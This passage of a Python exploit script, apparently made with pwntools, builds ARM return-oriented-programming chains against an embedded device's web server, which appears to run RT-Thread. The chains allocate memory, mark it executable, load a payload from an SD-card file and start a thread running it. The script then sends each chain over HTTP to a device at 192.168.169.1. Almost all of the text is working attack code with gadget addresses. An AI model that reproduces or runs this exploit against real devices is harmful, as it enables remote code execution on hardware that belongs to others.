    rop_chain += p32(0x00000c81) # r5 <- this is the last argument of the change attr function
    rop_chain += p32(0xc00d2e78) # r6
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc0533030) # pc

    # | 0xc0533030 | c0533030 | cpy r3,r5 | c0533034  | blx r6 | 

    # | 0xc00d2e78 | c00d2e78 | cpy r5,r9 | c00d2e7c | blx r4 | 

    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0xc0473224) # r4
    rop_chain += p32(0xc05c1dc9) # r5 <- ffs fopen was a thumb function
    rop_chain += p32(0xc075ed50) # r6 
    rop_chain += p32(0xc03adfec) # r7
    rop_chain += p32(0xc05f92d0) # r8 
    rop_chain += p32(0xc00a3594) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc00bad9c) # pc

    ## now we need to open a file, and load the bytes into the buffer (called file /mnt/sdcard/test.aac)
    # to call fopen("/mnt/sdcard/test.aac", "rb")
    # - c05f92d0 = "rb"
    # - c075ed50 = "/mnt/sdcard/test.aac"
    # - c05c1dc8 = fopen

    # | 0xc00bad9c | cpy r0,r6 | c00bada0 | blx r9 |   

    # | 0xc00a3594 | cpy r1,r8 | c00a3598 | blx r7 |

    # | 0xc03adfec | cpy r3,r5 | c03adfec | blx r4 |  

    # | 0xc0473224 | blx r3 | c0473228 | ldmia sp!,{r3,r4,r5,r6,r7,r8,r9,r10,r11,pc} | <- does the function call
    rop_chain += p32(0xc0426d4c) # r3 
    rop_chain += p32(payload_length) # r4 <- size of the read
    rop_chain += p32(0xc05c20b5) # r5 <- address of fread (its thumb)
    rop_chain += p32(0xc03edf0c) # r6
    rop_chain += p32(0x00000001) # r7 <- 1
    rop_chain += p32(0x00000000) # r8 
    rop_chain += p32(0x00000000) # r9
    rop_chain += p32(0xc08e4ee0 - 0xbc4) # r10 <- stored malloc'd buffer
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc040b604) # pc

    # now our opened fd is in r0, need to call fread(allocated_buffer, 1, size, stream (what is in r0 atm))
    # - c05c20b4 - address of fread

    # | c040b604 | ldr r8,[r10,#0xbc4] | c040b608 | blx r3 |

    # c0426d4c 00 30 a0 e1     cpy        r3,r0
    # c0426d50 04 20 a0 e1     cpy        r2,r4
    # c0426d54 07 10 a0 e1     cpy        r1,r7
    # c0426d58 08 00 a0 e1     cpy        r0,r8
    # c0426d5c 36 ff 2f e1     blx        r6

    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0x00000000) # r4
    rop_chain += p32(0x00000000) # r5
    rop_chain += p32(0x00000000) # r6 
    rop_chain += p32(0xc03edf0c) # r7
    rop_chain += p32(0xc08e4ee0) # r8 
    rop_chain += p32(0x00000000) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc057248c) # pc

    # | 0xc057248c | c057248c | ldr r5,[r8,#0x0] | c0572490 | blx r7 | 
    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 

    # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Construct the raw HTTP GET request
    request = method + b" /index.html HTTP/1.1\r\n"
    request += b"\r\naa" # padding

    request += rop_chain

    info(f"Request length: {len(request)}")

    # info the raw request for debugging
    info("Sending trigger + second ROP chain request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # Receive the response
            # info(s.recv(4096).decode('utf-8'))
       
        except Exception as e:
            info(f"An error occurred: {e}")

# mallocs a buffer, loads contents of test.aac, executes it in a thread
def do_index_html_req_for_code_exec_spin_up_thread(method, payload_length):
    # this ROP chain will first malloc a buffer (could put the size in language or something?)
    # then it will call `rt_hw_mmu_change_attr`
    # - param 1 is the address of the malloc'd buffer
    # - param 2 is the address of the malloc'd buffer - 0x80000000
    # - param 3 is the size of the malloc'd buffer
    # - param 4 is 0b0000110010000001 / 0xc81 / 3201

    # it will then somehow populate it - load from a file maybe, or a socket?
    # then we spin up a thread that runs the ting

    size_of_allocation = 0x100000

    rop_chain = p32(0xc03edf14) # pc

    ## do the initial malloc and save it somewhere (0x110 at the moment)

    # | 0xc03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} |
    rop_chain += p32(0xc00a5a90) # r4
    rop_chain += p32(0xc01a724c) # r5 <- function to call here (rt_malloc_align)
    rop_chain += p32(size_of_allocation) # r6 <- size of allocation
    rop_chain += p32(0x00001000) # r7 <- alignment value
    rop_chain += p32(0xc0473224) # r8
    rop_chain += p32(0xc0450540) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc0588e9c) # pc

    # | 0xc0588e9c | c0588e9c | mov r0,#0x0 | c0588ea0  | ldmia sp!,{r11,pc} | 
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc009c29c) # pc

    # | 0xc009c29c | c009c29c | cpy r1,r7 | c009c2a0  | blx r4 | 

    # | 0xc00a5a90 | c00a5a90 | cpy r0,r6 | c00a5a94 | blx r9 |

    # | 0xc0450540 | c0450540 | cpy r3,r5 | c0450544 | blx r8 | 
    
    # | 0xc0473224 | blx r3 | c0473228 | ldmia sp!,{r3,r4,r5,r6,r7,r8,r9,r10,r11,pc} | <- does the function call
    rop_chain += p32(0xc04fe360) # r3
    rop_chain += p32(0xc00d2838) # r4
    rop_chain += p32(0x00000000) # r5
    rop_chain += p32(0x80000000) # r6 <- subtract from our buffer to get physical memory
    rop_chain += p32(0xc0024820) # r7
    rop_chain += p32(0xc008f514) # r8 
    rop_chain += p32(0xc019ca6c) # r9 <- address of `rt_hw_mmu_change_attr`
    rop_chain += p32(size_of_allocation) # r10 <- this is the size argument of the change attr function
    rop_chain += p32(0xc08e4ee0 + 0x40) # r11 <- we back up the address of malloc'd buffer here
    rop_chain += p32(0xc0420f80) # pc

    ## now we call rt_hw_mmu_change_attr (r0 is our buffer address)

    # | 0xc0420f80 | c0420f80 | cpy r5,r0 | c0420f84  | blx r3 | 

    # | 0xc04fe360 | c04fe360 | cpy r1,r5 | c04fe364  | blx r4 | 

    # | 0xc00d2838 | c00d2838 | sub r1,r1,r6 | c00d283c  | blx r8 | 

    # | 0xc008f514 | cpy r2,r10 | c008f518 | blx r7 | 

    # store the malloc result somewhere safe if we need it again
    # | 0xc0024820 | ldmia sp!,{r4,pc} |
    rop_chain += p32(0xc0583f54) # r4
    rop_chain += p32(0xc0485d38) # pc

    # | 0xc0485d38 | c0485d38 | str r0,[r11,#-0x40] | c0485d3c  | blx r4 | 

    # | 0xc0583f54 | ldmia sp!,{r4,r5,r6,r11,pc} | 
    rop_chain += p32(0xc03edf0c) # r4
    rop_chain += p32(0x00000c81) # r5 <- this is the last argument of the change attr function
    rop_chain += p32(0xc00d2e78) # r6
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc0533030) # pc

    # | 0xc0533030 | c0533030 | cpy r3,r5 | c0533034  | blx r6 | 

    # | 0xc00d2e78 | c00d2e78 | cpy r5,r9 | c00d2e7c | blx r4 | 

    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0xc0473224) # r4
    rop_chain += p32(0xc05c1dc9) # r5 <- ffs fopen was a thumb function
    rop_chain += p32(0xc075ed50) # r6 
    rop_chain += p32(0xc03adfec) # r7
    rop_chain += p32(0xc05f92d0) # r8 
    rop_chain += p32(0xc00a3594) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc00bad9c) # pc

    ## now we need to open a file, and load the bytes into the buffer (called file /mnt/sdcard/test.aac)
    # to call fopen("/mnt/sdcard/test.aac", "rb")
    # - c05f92d0 = "rb"
    # - c075ed50 = "/mnt/sdcard/test.aac"
    # - c05c1dc8 = fopen

    # | 0xc00bad9c | cpy r0,r6 | c00bada0 | blx r9 |   
    # | 0xc00a3594 | cpy r1,r8 | c00a3598 | blx r7 |
    # | 0xc03adfec | cpy r3,r5 | c03adfec | blx r4 |  

    # | 0xc0473224 | blx r3 | c0473228 | ldmia sp!,{r3,r4,r5,r6,r7,r8,r9,r10,r11,pc} | <- does the function call
    rop_chain += p32(0xc0426d4c) # r3 
    rop_chain += p32(payload_length) # r4 <- size of the read
    rop_chain += p32(0xc05c20b5) # r5 <- address of fread (its thumb)
    rop_chain += p32(0xc03edf0c) # r6
    rop_chain += p32(0x00000001) # r7 <- 1
    rop_chain += p32(0x00000000) # r8 
    rop_chain += p32(0x00000000) # r9
    rop_chain += p32(0xc08e4ee0 - 0xbc4) # r10 <- stored malloc'd buffer
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc040b604) # pc

    # now our opened fd is in r0, need to call fread(allocated_buffer, 1, size, stream (what is in r0 atm))
    # - c05c20b4 - address of fread

    # | c040b604 | ldr r8,[r10,#0xbc4] | c040b608 | blx r3 |

    # c0426d4c 00 30 a0 e1     cpy        r3,r0
    # c0426d50 04 20 a0 e1     cpy        r2,r4
    # c0426d54 07 10 a0 e1     cpy        r1,r7
    # c0426d58 08 00 a0 e1     cpy        r0,r8
    # c0426d5c 36 ff 2f e1     blx        r6

    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0x00000000) # r4
    rop_chain += p32(0xc01fd974) # r5 <- address of pthread_attr_init
    rop_chain += p32(0xc09cc4a8) # r6 <- address of our attribute thing (copied into r0)
    rop_chain += p32(0x00000000) # r7
    rop_chain += p32(0x00000000) # r8 
    rop_chain += p32(0xc03edf0c) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc00bad9c) # pc

    # need to do the following:
    # - call pthread_attr_init
    # - call pthread_attr_setstacksize(0x4000)
    # - call pthread_attr_setschedparam(0xf)
    # - call pthread_create

    # | 0xc00bad9c | cpy r0,r6 | c00bada0 | blx r9 |  

    ## call pthread_attr_init
    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0x00000000) # r4
    rop_chain += p32(0xc01fdb84) # r5 <- address of pthread_attr_setstacksize
    rop_chain += p32(0xc09cc4a8) # r6 <- address of our attribute thing (copied into r0)
    rop_chain += p32(0xc03edf0c) # r7
    rop_chain += p32(0x00004000) # r8 <- stack size (copied into r1)
    rop_chain += p32(0xc00a3594) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc00bad9c) # pc

    # | 0xc00bad9c | cpy r0,r6 | c00bada0 | blx r9 |  
    # | 0xc00a3594 | cpy r1,r8 | c00a3598 | blx r7 |

    ## call pthread_attr_setstacksize
    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0x00000000) # r4
    rop_chain += p32(0xc01fdacc) # r5
    rop_chain += p32(0xc09cc4a8) # r6 <- address of our attribute thing (copied into r0)
    rop_chain += p32(0xc03edf0c) # r7
    rop_chain += p32(0xc04528b8) # r8 <- pointer to 0xf (schedparam)
    rop_chain += p32(0xc00a3594) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc00bad9c) # pc

    # | 0xc00bad9c | cpy r0,r6 | c00bada0 | blx r9 |  
    # | 0xc00a3594 | cpy r1,r8 | c00a3598 | blx r7 |

    ## call pthread_attr_setschedparam
    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0xc0011590) # r4
    rop_chain += p32(0x00000000) # r5 <- has to be null
    rop_chain += p32(0xc09cc3a8) # r6 <- address thread id gets saved to
    rop_chain += p32(0xc03adfec) # r7
    rop_chain += p32(0xc09cc4a8) # r8 <- address of attribute thing
    rop_chain += p32(0xc00a3594) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc00bad9c) # pc

    # | 0xc00bad9c | cpy r0,r6 | c00bada0 | blx r9 |   
    # | 0xc00a3594 | cpy r1,r8 | c00a3598 | blx r7 |
    # | 0xc03adfec | cpy r3,r5 | c03adfec | blx r4 |  

    # | 0xc0011590 | ldmia sp!,{r4,r5,r6,r7,r8,pc} |
    rop_chain += p32(0x00000000) # r4
    rop_chain += p32(0x00000000) # r5
    rop_chain += p32(0xc00388dc) # r6
    rop_chain += p32(0xc04773a0) # r7
    rop_chain += p32(0xc08e4ee0) # r8 <- malloc'd buffer (gets copied into r2)
    rop_chain += p32(0xc057248c) # pc

    # | 0xc057248c | c057248c | ldr r5,[r8,#0x0] | c0572490 | blx r7 | 

    # | 0xc04773a0 | c04773a0 | cpy r2,r5 | c04773a4  | blx r6 | 

    # | 0xc00388dc | ldmia sp!,{r4,r5,pc} |
    rop_chain += p32(0x00000000) # r4
    rop_chain += p32(0xc037d578) # r5 <- address of pthread_create
    rop_chain += p32(0xc03edf0c) # pc

    ## call pthread_create and do fixup after
    # | 0xc03edf0c | c03edf0c | blx r5 | c03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    rop_chain += p32(0xc006bac0) # r4
    rop_chain += p32(0xc09ae8d4 - 0x4) # r5
    rop_chain += p32(0xc04460f0) # r6
    rop_chain += p32(0xc03d444c) # r7
    rop_chain += p32(0xc006aa74 - 1) # r8 (-1 to account for later clobber)
    rop_chain += p32(0xdeadbeef) # r9
    rop_chain += p32(0xdeadbeef) # r11
    rop_chain += p32(0xc0533030) # pc

    ## now fix up the stack ting, need to get stack pointer before the big proc buffers, then jump to end of function to pop them, then win

    # | 0xc0533030 | c0533030 | cpy r3,r5 | c0533034 | blx r6 | 
    # | 0xc04460f0 | c04460f0 | ldr r6,[r3,#0x4] | c04460f4 | blx r7 | 
    # | 0xc03d444c | c03d444c | cpy r7,r6 | c03d4460 | blx r4 | <- so we can clobber lower registers and keep r7 safe, clobbers r6, r1, r0, r8 (should be fine here)

    # 0xc006bac0: ldmia sp!,{r4,r5,r6,pc} 
    rop_chain += p32(0xc06f06e8 - 4) # r4 <- where we load offset we add from - 4
    rop_chain += p32(0xdeadbeef) # r5
    rop_chain += p32(0xc050c2a0) # r6
    rop_chain += p32(0xc013d628) # pc

    # | 0xc013d628 | 0xc013d628 | ldr r1,[r4,#0x4] | 0xc013d62c | blx r6 |
    # | 0xc050c2a0 | c050c2a0 | add r1,r7,r1 | c050c2a4  | blx r8 |  <- could work? Need to pre populate r8 earlier on (and account for clobbering)

    #  0xc006aa74 : ldmia sp!,{r4,r5,r6,r7,r8,pc}
    rop_chain += p32(0xc02202e4) # r4 <- we resume normal control here to 0xc021ff38 (because we should have now reset the stack pointer properly)
    rop_chain += p32(0xdeadbeef) # r5
    rop_chain += p32(0xc05c49d9) # r6 <- this is a thumb mode gadget
    rop_chain += p32(0xc09afec0) # r7
    rop_chain += p32(0xc03b2c40) # r8
    rop_chain += p32(0xc0533910) # pc

    # | 0xc0533910 | c0533910 | cpy r10,r1  | c0533914  | blx r8 | 
    # | 0xc03b2c40 | c03b2c40 | mov r8,#0x0 | c03b2c44 | blx r6 |
    # | 0xc05c49d8 | c05c49d8 | add.w r11,r10,r8 | c05c49e0  | blx r4  | <- clobbers r1/2, thumb as well probs, but sets the r11 to something we control


    # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Construct the raw HTTP GET request
    request = method + b" /index.html HTTP/1.1\r\n"
    request += b"\r\naa" # padding

    request += rop_chain

    info(f"Request length: {len(request)}")

    # info the raw request for debugging
    info("Sending trigger + second ROP chain request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # Receive the response
            # info(s.recv(4096).decode('utf-8'))
       
        except Exception as e:
            info(f"An error occurred: {e}")
